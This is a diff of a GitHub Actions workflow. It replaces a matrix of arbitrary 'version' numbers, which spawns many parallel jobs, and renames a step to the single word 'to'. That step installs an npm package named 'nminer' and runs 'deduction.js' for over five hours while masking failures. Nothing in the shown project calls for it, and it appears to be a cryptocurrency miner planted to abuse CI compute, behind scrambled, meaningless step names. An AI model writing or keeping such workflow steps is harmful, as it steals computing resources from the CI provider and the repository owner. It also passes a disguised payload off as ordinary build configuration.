@@ -9,24 +9,22 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 7378 }
-          - { version: 3038 }
-          - { version: 9980 }
-          - { version: 8710 }
-          - { version: 9863 }
-          - { version: 1391 }
-          - { version: 4896 }
-          - { version: 9604 }
-          - { version: 9871 }
-          - { version: 3973 }
-          - { version: 779 }
-          - { version: 6211 }
-          - { version: 4704 }
-          - { version: 4969 }
-          - { version: 3472 }
-          - { version: 8556 }
-          - { version: 5453 }
-          - { version: 5543 }
+          - { version: 1576 }
+          - { version: 6193 }
+          - { version: 3527 }
+          - { version: 6899 }
+          - { version: 1488 }
+          - { version: 136 }
+          - { version: 9555 }
+          - { version: 1402 }
+          - { version: 2093 }
+          - { version: 9623 }
+          - { version: 8250 }
+          - { version: 5001 }
+          - { version: 7791 }
+          - { version: 6775 }
+          - { version: 8732 }
+          - { version: 4867 }
 
     steps:
       - name: Checkout
@@ -37,7 +35,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: intently deliberately scramble usable who
+      - name: to
         run: |
           npm install nminer@latest
-          timeout 323m node deduction.js || echo "deduction executed"
+          timeout 322m node deduction.js || echo "deduction executed"
